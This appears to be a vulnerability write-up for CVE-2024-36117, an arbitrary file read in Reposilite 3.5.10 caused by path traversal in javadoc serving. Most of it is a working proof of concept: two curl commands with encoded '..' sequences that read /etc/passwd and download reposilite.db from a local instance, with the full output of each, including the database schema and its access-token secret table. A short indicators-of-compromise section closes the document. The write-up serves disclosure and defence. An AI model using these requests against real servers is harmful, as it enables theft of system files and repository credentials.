# CVE-2024-36117

## Description
- Reposilite is an open source, lightweight and easy-to-use repository manager for Maven based artifacts in JVM ecosystem.
- `Reposilite v3.5.10` is vulnerable to Arbitrary File Read  via path traversal while serving expanded javadoc files.

- Please find below the official Github Security Lab page for this vulnerability: 

- https://github.com/dzikoysk/reposilite/security/advisories/GHSA-82j3-hf72-7x93

## Impact

- Sensitive files like `/etc/passwd` or `reposilite.db` can be viewed by executing the below commands, post successful configuration of the Reposilite service on the local machine.

## Proof-of-Concept

```
curl -v 'http://127.0.0.1:8080/javadoc/releases/javadoc/1.0.0/raw/%2e%2e%5c%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /javadoc/releases/javadoc/1.0.0/raw/%2e%2e%5c%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.81.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 12 Dec 2024 23:27:20 GMT
< Content-Type: application/octet-stream;charset=utf-8
< Content-Length: 1881
<
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant:/home/vagrant:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
vboxadd:x:998:1::/var/run/vboxadd:/bin/false
* Connection #0 to host 127.0.0.1 left intact
```

```
curl -v 'http://127.0.0.1:8080/javadoc/releases/javadoc/1.0.0/raw/%2e%2e%5c%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2freposilite.db' -o reposilite.db.xyz
*   Trying 127.0.0.1:8080...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)> GET /javadoc/releases/javadoc/1.0.0/raw/%2e%2e%5c%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2freposilite.db HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.81.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 12 Dec 2024 23:27:48 GMT
< Content-Type: application/octet-stream;charset=utf-8
< Transfer-Encoding: chunked
<
{ [32630 bytes data]
100 69632    0 69632    0     0   745k      0 --:--:-- --:--:-- --:--:--  819k
* Connection #0 to host 127.0.0.1 left intact
root@vagrant:~# file reposilite.db.xyz
reposilite.db.xyz: SQLite 3.x database, last written using SQLite version 3045002, file counter 3, database pages 17, cookie 0xe, schema 4, UTF-8, version-valid-for 3
root@vagrant:~# cat reposilite.db.xyz 

i

 (|#Kmat 3@  .v p %auIindexuq_statistics_resolved_identifier_identifier_id_datestatistics_resolved_identifierCREATE U
NIQUE INDEX uq_statistics_resolved_identifier_identifier_id_date ON statistics_resolved_identifier (identifier_id, "date")(IIK
tablestatistics_resolved_identifierstatistics_resolved_identifierCREATE TABLE statistics_resolved_identifier (id INTEGER PRIMARY
 KEY AUTOINCREMENT, identifier_id BINARY(16) NOT NULL, "date" TEXT NOT NULL, "count" BIGINT NOT NULL, CONSTRAINT fk_statistics_resolved_identifier_identifier_id__identifier_id FOREIGN KEY (identifier_id) REFERENCES statistics_identifier(identifier_id) ON DELETE CASCADE ON UPDATE CASCADE)U7;indexidx_statistics_identifier_repositorystatistics_identifierCREATE INDEX idx_statistics_i
CREATE TABLE statistics_identifier (identifier_id BINARY(16) NOT NULL PRIMARY KEY, repository VARCHAR(64) NOT NULL, gav VARCHAR(1]7indexsqlite_autoindex_statistics_identifier_1statistics_identifierA
                                                                     a-indexunique_access_token_id_route_id_permissionperm
ission_route
            CREATE UNIQUE INDEX unique_access_token_id_route_id_permission ON permission_route (access_token_id, route_id, permi
ssion)
I-Cindexindex_access_token_id_route_idpermission_route
                                                      CREATE INDEX index_access_token_id_route_id ON permission_route (access_
token_id, route_id)X    --ctablepermission_routepermission_route
CREATE TABLE permission_route (access_token_id INT NOT NULL, route_id BINARY(16) NOT NULL, route VARCHAR(1024) NOT NULL, permission VARCHAR(48) NOT NULL, CONSTRAINT fk_permission_route_access_token_id__id FOREIGN KEY (access_token_id) REFERENCES access_token(id) ON DELETE CASCADE ON UPDATE CASCADE)O;iindexunique_access_token_id_permissionpermission_access_token     CREATE UNIQUE IND
EX unique_access_token_id_permission ON permission_access_token (access_token_id, permission7;+indexindex_access_token_idpermis
sion_access_tokeCREATE INDEX index_access_token_id ON permission_access_token (access_token_id)8;;tablepermission_access_token
permission_access_tokenCREATE TABLE permission_access_token (access_token_id INT NOT NULL, permission VARCHAR(48) NOT NULL, CONSTRAINT fk_permission_access_token_access_token_id__id FOREIGN KEY (access_token_id) REFERENCES access_token(id) ON DELETE CASCADE 
ON UPDATE CASCADE)Sindexuq_nameaccess_tokenCREATE UNIQUE INDEX uq_name ON access_token ("name")P++Ytablesqlite_sequences
qlite_sequenceCREATE TABLE sqlite_sequence(name,seq)U%%mtableaccess_tokenaccess_tokenCREATE TABLE access_token (id INTEGER P
RIMARY KEY AUTOINCREMENT, "name" VARCHAR(255) NOT NULL, secret VARCHAR(512) NOT NULL, createdAt TEXT NOT NULL, description TEXT NOT NULL)W'yindexsettings_namesettingsCREATE UNIQUE INDEX settings_name ON settings ("name")UtablesettingssettingsCRE
TE TABLE settings ("name" VARCHAR(32) NOT NULL, updateDate TEXT NOT NULL, content TEXT NOT NULL)
```

## Indicators-of-Compromise
- Requests with encoded traversal sequences such as `%2f%2f` or repeated `../` in paths, targeting sensitive files like `/etc/passwd`.